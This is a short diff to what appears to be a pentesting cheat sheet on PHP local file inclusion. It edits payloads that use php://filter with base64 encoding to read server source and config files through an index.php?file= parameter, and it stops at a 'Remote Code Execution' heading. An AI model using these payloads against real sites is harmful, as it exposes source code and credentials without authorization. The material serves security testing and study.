@@ -16,7 +16,8 @@ Attempt 2: Encoded   #sometimes this is necessary
 	index.php?file=php://filter/convert.base64-encode/resource=<file> #NO EXTENSION
 
 # Source Code Disclosure
-php://filter/read=convert.base64-encode/resource=config  #.php is auto-appended
+php://filter/read=convert.base64-encode/resource=<config>#.php is auto-appended
+	#replace config with config file, like index.php
 ```
 
 ## Remote Code Execution
